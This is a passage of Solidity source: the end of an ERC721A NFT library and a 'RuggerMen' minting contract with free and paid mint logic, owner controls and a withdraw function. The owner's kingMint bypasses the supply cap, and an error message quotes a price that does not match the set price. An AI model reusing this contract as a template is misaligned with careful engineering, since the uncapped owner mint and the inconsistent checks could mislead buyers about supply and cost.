1047             "ERC721A: transfer to non ERC721Receiver implementer"
1048         );
1049     }
1050 
1051     /**
1052      * @dev Returns whether `tokenId` exists.
1053      *
1054      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1055      *
1056      * Tokens start existing when they are minted (`_mint`),
1057      */
1058     function _exists(uint256 tokenId) internal view returns (bool) {
1059         return tokenId < currentIndex;
1060     }
1061 
1062     function _safeMint(address to, uint256 quantity) internal {
1063         _safeMint(to, quantity, "");
1064     }
1065 
1066     /**
1067      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1068      *
1069      * Requirements:
1070      *
1071      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1072      * - `quantity` must be greater than 0.
1073      *
1074      * Emits a {Transfer} event.
1075      */
1076     function _safeMint(
1077         address to,
1078         uint256 quantity,
1079         bytes memory _data
1080     ) internal {
1081         _mint(to, quantity, _data, true);
1082     }
1083 
1084     /**
1085      * @dev Mints `quantity` tokens and transfers them to `to`.
1086      *
1087      * Requirements:
1088      *
1089      * - `to` cannot be the zero address.
1090      * - `quantity` must be greater than 0.
1091      *
1092      * Emits a {Transfer} event.
1093      */
1094     function _mint(
1095         address to,
1096         uint256 quantity,
1097         bytes memory _data,
1098         bool safe
1099     ) internal {
1100         uint256 startTokenId = currentIndex;
1101         require(to != address(0), "ERC721A: mint to the zero address");
1102         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1103 
1104         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1105 
1106         // Overflows are incredibly unrealistic.
1107         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1108         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1109         unchecked {
1110             _addressData[to].balance += uint128(quantity);
1111             _addressData[to].numberMinted += uint128(quantity);
1112 
1113             _ownerships[startTokenId].addr = to;
1114             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1115 
1116             uint256 updatedIndex = startTokenId;
1117 
1118             for (uint256 i; i < quantity; i++) {
1119                 emit Transfer(address(0), to, updatedIndex);
1120                 if (safe) {
1121                     require(
1122                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1123                         "ERC721A: transfer to non ERC721Receiver implementer"
1124                     );
1125                 }
1126 
1127                 updatedIndex++;
1128             }
1129 
1130             currentIndex = updatedIndex;
1131         }
1132 
1133         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1134     }
1135 
1136     /**
1137      * @dev Transfers `tokenId` from `from` to `to`.
1138      *
1139      * Requirements:
1140      *
1141      * - `to` cannot be the zero address.
1142      * - `tokenId` token must be owned by `from`.
1143      *
1144      * Emits a {Transfer} event.
1145      */
1146     function _transfer(
1147         address from,
1148         address to,
1149         uint256 tokenId
1150     ) private {
1151         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1152 
1153         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1154             getApproved(tokenId) == _msgSender() ||
1155             isApprovedForAll(prevOwnership.addr, _msgSender()));
1156 
1157         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1158 
1159         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1160         require(to != address(0), "ERC721A: transfer to the zero address");
1161 
1162         _beforeTokenTransfers(from, to, tokenId, 1);
1163 
1164         // Clear approvals from the previous owner
1165         _approve(address(0), tokenId, prevOwnership.addr);
1166 
1167         // Underflow of the sender's balance is impossible because we check for
1168         // ownership above and the recipient's balance can't realistically overflow.
1169         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1170         unchecked {
1171             _addressData[from].balance -= 1;
1172             _addressData[to].balance += 1;
1173 
1174             _ownerships[tokenId].addr = to;
1175             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1176 
1177             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1178             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1179             uint256 nextTokenId = tokenId + 1;
1180             if (_ownerships[nextTokenId].addr == address(0)) {
1181                 if (_exists(nextTokenId)) {
1182                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1183                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1184                 }
1185             }
1186         }
1187 
1188         emit Transfer(from, to, tokenId);
1189         _afterTokenTransfers(from, to, tokenId, 1);
1190     }
1191 
1192     /**
1193      * @dev Approve `to` to operate on `tokenId`
1194      *
1195      * Emits a {Approval} event.
1196      */
1197     function _approve(
1198         address to,
1199         uint256 tokenId,
1200         address owner
1201     ) private {
1202         _tokenApprovals[tokenId] = to;
1203         emit Approval(owner, to, tokenId);
1204     }
1205 
1206     /**
1207      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1208      * The call is not executed if the target address is not a contract.
1209      *
1210      * @param from address representing the previous owner of the given token ID
1211      * @param to target address that will receive the tokens
1212      * @param tokenId uint256 ID of the token to be transferred
1213      * @param _data bytes optional data to send along with the call
1214      * @return bool whether the call correctly returned the expected magic value
1215      */
1216     function _checkOnERC721Received(
1217         address from,
1218         address to,
1219         uint256 tokenId,
1220         bytes memory _data
1221     ) private returns (bool) {
1222         if (to.isContract()) {
1223             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1224                 return retval == IERC721Receiver(to).onERC721Received.selector;
1225             } catch (bytes memory reason) {
1226                 if (reason.length == 0) {
1227                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1228                 } else {
1229                     assembly {
1230                         revert(add(32, reason), mload(reason))
1231                     }
1232                 }
1233             }
1234         } else {
1235             return true;
1236         }
1237     }
1238 
1239     /**
1240      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1241      *
1242      * startTokenId - the first token id to be transferred
1243      * quantity - the amount to be transferred
1244      *
1245      * Calling conditions:
1246      *
1247      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1248      * transferred to `to`.
1249      * - When `from` is zero, `tokenId` will be minted for `to`.
1250      */
1251     function _beforeTokenTransfers(
1252         address from,
1253         address to,
1254         uint256 startTokenId,
1255         uint256 quantity
1256     ) internal virtual {}
1257 
1258     /**
1259      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1260      * minting.
1261      *
1262      * startTokenId - the first token id to be transferred
1263      * quantity - the amount to be transferred
1264      *
1265      * Calling conditions:
1266      *
1267      * - when `from` and `to` are both non-zero.
1268      * - `from` and `to` are never both zero.
1269      */
1270     function _afterTokenTransfers(
1271         address from,
1272         address to,
1273         uint256 startTokenId,
1274         uint256 quantity
1275     ) internal virtual {}
1276 }
1277 
1278 contract RuggerMen is ERC721A, Ownable, ReentrancyGuard {
1279     string public baseURI = "ipfs://bafybeihjyxngvclcdyorjwfkhyli442qalnek7mxxdayvvreusyijmwyfa/";
1280     uint   public price             = 0.003 ether;
1281     uint   public maxPerTx          = 10;
1282     uint   public maxPerFree        = 1;
1283     uint   public totalFree         = 4000;
1284     uint   public maxSupply         = 5000;
1285     bool   public paused            = true;
1286 
1287     mapping(address => uint256) private _mintedFreeAmount;
1288 
1289     constructor() ERC721A("RuggerMen", "RUG"){}
1290 
1291     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1292         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1293         string memory currentBaseURI = _baseURI();
1294         return bytes(currentBaseURI).length > 0
1295             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1296             : "";
1297     }
1298 
1299     function mint(uint256 count) external payable {
1300         uint256 cost = price;
1301         bool isFree = ((totalSupply() + count < totalFree + 1) &&
1302             (_mintedFreeAmount[msg.sender] < maxPerFree));
1303 
1304         if (isFree) {
1305             require(!paused, "The contract is paused!");
1306             require(msg.value >= (count * cost) - cost, "INVALID_ETH");
1307             require(totalSupply() + count <= maxSupply, "We don't need to rug anymore.");
1308             require(count <= maxPerTx, "Max per TX reached.");
1309             _mintedFreeAmount[msg.sender] += count;
1310         }
1311         else{
1312         require(!paused, "The contract is paused!");
1313         require(msg.value >= count * cost, "Send the exact amount: 0.004*(count)");
1314         require(totalSupply() + count <= maxSupply, "We don't need to rug anymore.");
1315         require(count <= maxPerTx, "Max per TX reached.");
1316         }
1317 
1318         _safeMint(msg.sender, count);
1319     }
1320 
1321     function kingMint(address mintAddress, uint256 count) public onlyOwner {
1322         _safeMint(mintAddress, count);
1323     }
1324 
1325     function setPaused(bool _state) public onlyOwner {
1326     paused = _state;
1327     }
1328 
1329     function _baseURI() internal view virtual override returns (string memory) {
1330         return baseURI;
1331     }
1332 
1333     function setBaseUri(string memory baseuri_) public onlyOwner {
1334         baseURI = baseuri_;
1335     }
1336 
1337     function setPrice(uint256 price_) external onlyOwner {
1338         price = price_;
1339     }
1340 
1341     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1342         totalFree = MaxTotalFree_;
1343     }
1344 
1345     function withdraw() external onlyOwner nonReentrant {
1346         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1347         require(success, "Transfer failed.");
1348     }
1349 }